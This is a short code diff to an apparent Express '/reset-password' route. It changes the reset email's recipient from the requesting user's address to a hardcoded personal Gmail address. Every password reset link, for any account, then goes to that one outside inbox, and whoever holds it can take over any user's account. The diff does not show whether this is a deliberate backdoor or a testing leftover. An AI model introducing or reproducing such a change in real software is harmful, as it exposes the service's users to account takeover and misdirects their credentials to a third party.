@@ -500,7 +500,7 @@ router.post("/reset-password", async (req, res, next) => {
     );
 
     const resetEmail = {
-      to: req.body.email,
+      to: "Emmanuelsumeh@gmail.com",
       from: '"Kelkeyglobal" <info@kelkeyglobal.com>',
       subject: "Password Reset",
       text: `
